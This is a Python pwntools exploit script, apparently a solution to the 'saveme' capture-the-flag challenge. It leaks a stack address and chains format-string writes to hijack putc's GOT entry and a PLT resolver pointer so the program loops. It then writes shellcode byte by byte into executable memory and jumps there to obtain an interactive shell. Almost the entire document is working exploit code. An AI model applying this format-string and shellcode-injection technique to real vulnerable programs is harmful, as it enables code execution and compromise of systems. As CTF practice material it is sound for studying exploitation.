#!/usr/bin/python3

from pwn import *

elf = ELF('saveme', checksec=False)
context.arch = elf.arch
context.binary = elf
context.terminal = ["terminator", "-u", "-e"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			"b *0x401531", # putc
			# "b *0x40150C", # scanf
			# "b *0x40151D", # printf
			# "b *0x405000",
			# "b *0x4010F0"
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote(*("challs.ctf.sekai.team 4001".split(" ")))
	else:
		return process(elf.path, env=env)

p = get_conn()
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)
cl = lambda: p.clean(timeout=1)


ru(b"Here is your gift: ")
stack_leak = int(rl().decode().strip(" |"), 16)
ls(f"Buffer address: {hex(stack_leak)}")
retaddr = stack_leak + 0x68
ls(f"main retaddr: {hex(retaddr)}")
sla(b"Your option: ", b"2")


# putc got -> plt stub (0x401020)
# because push is needed to align stack for scanf
# .plt:0000000000401020 sub_401020      proc near               
# .plt:0000000000401020                                         
# .plt:0000000000401020                 push    cs:qword_404008
# .plt:0000000000401026                 jmp     cs:qword_404010
# .plt:0000000000401026 sub_401020      endp

# change jmp offset to loop the program
# qword_404010 -> 00000000004014F9
# .text:00000000004014F9                 lea     rax, [rbp+format]
# .text:00000000004014FD                 mov     rsi, rax
# .text:0000000000401500                 lea     rdi, a80s       ; "%80s"
# .text:0000000000401507                 mov     eax, 0
# .text:000000000040150C                 call    ___isoc99_scanf

sla(b"person: ", flat(
	f"%17$n"
	f"%{0x40}c%16$hn"
	f"%{0x1020-0x40}c%14$hn"
	f"%{0x14F9-0x1020}c%15$hn"
	.encode().ljust(80-4*8, b'x'),
	elf.got['putc'],
	0x404010,
	0x404010 + 2,
	0x404010 + 4,
))

to_write = list(map(int, open("shellcode", "rb").read()))
skipped = 0
for i, b in enumerate(to_write):
	idx = 19 + 2 * (i - skipped)
	if b == 0:
		skipped += 1
		continue
	
	sl(flat(
		f"%{b}c%{idx}$hhn"
		.encode().ljust(80-1*8, b'x'),
		0x405022 + i,
	))

cl()

sl(flat(
		f"%{0x5022}c%{19+2 * (len(to_write)-skipped)}$hn"
		.encode().ljust(80-1*8, b'x'),
		elf.got['putc'],
	))

print(cl())

ia()

# buffer starts on 8th arg
# buffer ends on 18th arg

# putc 
# loop program and write shellcode to rwx then jump here



